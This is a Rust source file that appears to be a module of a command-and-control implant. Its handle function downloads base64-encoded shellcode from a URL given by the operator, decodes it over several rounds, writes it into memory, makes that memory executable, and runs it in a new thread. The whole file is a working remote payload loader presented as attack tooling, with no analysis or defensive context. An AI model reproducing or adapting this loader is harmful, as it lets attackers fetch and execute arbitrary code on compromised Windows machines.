use std::error::Error;
use crate::logger::Logger;
#[cfg(windows)] use base64::decode as b64_decode;
extern crate kernel32;
use winapi::um::winnt::{PVOID, PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READ};
use std::ptr;
use std::io;
use std::io::prelude::*;
use std::io::{stdin, stdout, Read, Write};
use winapi::um::errhandlingapi;
use winapi::um::processthreadsapi;
use winapi::um::winbase;
use winapi::um::synchapi::WaitForSingleObject;
use std::process;
#[cfg(windows)] use reqwest::Client;

type DWORD = u32;

pub async fn handle(base64_string: &String, logger: &Logger) -> Result<String, Box<dyn Error>> {
    #[cfg(windows)] {
        // Input: url to shellcode -p pid
        let mut args = base64_string.split(" ");
        
        // Set up our variables; each one could fail on us.
        // Yes this is a lot of verbose error checking, but this
        // has to be rock solid or the agent will die.
        let mut url: &str;
        let mut b64_iterations: u32;

        // Get URL
        match args.nth(0) {
            Some(u) => { 
                logger.debug(format!("Shellcode URL: {}", &u));
                url = u; 
            },
            None    => { return Ok("Could not parse URL".to_string()); }
        };

        // Get b64_iterations
        match args.nth(0) {
            Some(bs) => {
                if let Ok(b) = bs.parse::<u32>() {
                    b64_iterations = b;
                } else {
                    return Ok("Could not parse b64 iterations".to_string());
                }
            },
            None => { return Ok("Could not extract b64 iterations".to_string()); }
        };

        logger.debug(format!("Injecting into current process..."));
        let client = Client::new();
        if let Ok(r) = client.get(url).send().await {
            if r.status().is_success() {   
                logger.info(format!("Got the shellcode")); 
                // Get the shellcode. Now we have to decode it
                let mut shellcode_encoded: Vec<u8>;
                let mut shellcode_string: String;
                let mut shellcode: Vec<u8>;
                if let Ok(sc) = r.text().await {
                    shellcode_encoded = Vec::from(sc.trim().as_bytes());
                    logger.info(format!("Got encoded bytes"));
                    for i in 0..b64_iterations {
                        logger.debug(format!("Decode iteration: {i}"));
                        match b64_decode(shellcode_encoded) {
                            Ok(d) => {
                                shellcode_encoded = d
                                    .into_iter()
                                    .filter(|&b| b != 0x0a)
                                    .collect();
                            },
                            Err(e) => { return Ok(e.to_string()); }
                        };
                        
                    }
                    // Convert bytes to our proper string
                    shellcode_string = String::from_utf8(shellcode_encoded)?;
                    // At this point, we have the comma-separated "0xNN" form of the shellcode.
                    // We need to get each one until a proper u8.
                    shellcode = shellcode_string
                        .split(",")
                        .map(|s| s.replace("0x", ""))
                        .map(|s| s.replace(" ", ""))                    
                        .map(|s|{ 
                            match u8::from_str_radix(&s, 16) {
                                Ok(b) => b,
                                Err(_) => 0
                            }
                        })
                        .collect();
    
                } else {
                    let err_msg = "Could not decode shellcode";
                    logger.err(err_msg.to_string());
                    return Ok(err_msg.to_string());
                }
                
                unsafe{
                    let base_addr = kernel32::VirtualAlloc(
                        ptr::null_mut(),
                        shellcode.len().try_into().unwrap(),
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_READWRITE
                    );
                
                    if base_addr.is_null() { 
                        println!("[-] Couldn't allocate memory to current proc.")
                    } else {
                        println!("[+] Allocated memory to current proc.");
                    }
    
                    // copy shellcode into mem
                    println!("[*] Copying Shellcode to address in current proc.");
                    std::ptr::copy(shellcode.as_ptr() as  _, base_addr, shellcode.len());
                    println!("[*] Copied...");
    
    
                    // Flip mem protections from RW to RX with VirtualProtect. Dispose of the call with `out _`
                    println!("[*] Changing mem protections to RX...");
    
                    let mut old_protect: DWORD = PAGE_READWRITE;
    
                    let mem_protect = kernel32::VirtualProtect (
                        base_addr,
                        shellcode.len() as u64,
                        PAGE_EXECUTE_READ,
                        &mut old_protect
                    );
    
                    if mem_protect == 0 {
                        let error = errhandlingapi::GetLastError();
                        println!("[-] Error: {}", error.to_string());
                        process::exit(0x0100);
                    }
    
                // Call CreateThread
    
                println!("[*] Calling CreateThread...");
    
                let mut tid = 0;
                let ep: extern "system" fn(PVOID) -> u32 = { std::mem::transmute(base_addr) };
    
                let h_thread = processthreadsapi::CreateThread(
                    ptr::null_mut(),
                    0,
                    Some(ep),
                    ptr::null_mut(),
                    0,
                    &mut tid
                );
    
                if h_thread.is_null() {
                    let error = unsafe { errhandlingapi::GetLastError() };
                    println!("{}", error.to_string())
                
                } else {
                    println!("[+] Thread Id: {}", tid)
                }
    
                // CreateThread is not a blocking call, so we wait on the thread indefinitely with WaitForSingleObject. This blocks for as long as the thread is running
    
                println!("[*] Calling WaitForSingleObject...");
    
                let status = WaitForSingleObject(h_thread, winbase::INFINITE);
                if status == 0 {
                    println!("[+] Good!")
                } else {
                    let error = errhandlingapi::GetLastError();
                    println!("{}", error.to_string())
                }
        }
                
                return Ok("Injection completed!".to_string());
            } else {
                return Ok("Could not download shellcode".to_string());
            }   

        } else {
            return Ok(format!("Could not download from {url}"));
        }
    }
    
    #[cfg(not(windows))] {
        Ok("Can only inject shellcode on Windows!".to_string())
    }
}